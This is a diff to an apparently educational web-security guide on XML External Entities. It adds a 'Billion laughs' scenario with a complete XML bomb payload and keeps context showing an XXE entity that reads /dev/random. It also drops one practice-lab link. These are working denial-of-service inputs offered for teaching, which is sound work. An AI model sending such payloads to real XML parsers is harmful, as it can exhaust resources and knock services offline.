@@ -131,9 +131,33 @@ An attacker attempts a denial-of-service attack by including a potentially endle
 <!ENTITY xxe SYSTEM "file:///dev/random" >]>
 ```
 
+### Scenario #4:
+
+An attacker attempts a denial-of-service attack by expanding entities, like [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack). 
+
+👉 Check [XML Bomb attack](/attacks_explained/xml_bomb) in this Guide for more details
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+
 ## Hacking Playground
 
-- [🐐 NodeGoat | A4 XML External Entities (XXE)](https://nodegoat.herokuapp.com/tutorial/a4)
 - [🧃 Pwning OWASP Juice Shop | A4 XML External Entities (XXE)](https://pwning.owasp-juice.shop/part2/xxe.html)
 
 
